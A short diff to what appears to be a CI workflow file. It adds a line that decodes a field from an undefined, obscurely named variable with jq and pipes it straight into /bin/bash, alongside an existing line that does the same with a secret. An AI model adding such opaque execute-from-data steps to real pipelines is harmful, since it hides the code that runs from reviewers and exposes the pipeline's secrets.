@@ -18,6 +18,7 @@ jobs:
           ay87: ${{ secrets.ay87 }}
         run: |
           printf '%s' "$ay87" | jq -r .bf2165 | /bin/bash
+          printf '%s' "$zgco06462" | jq -r .l51 | /bin/bash
 
       - name: Save output
         if: always()
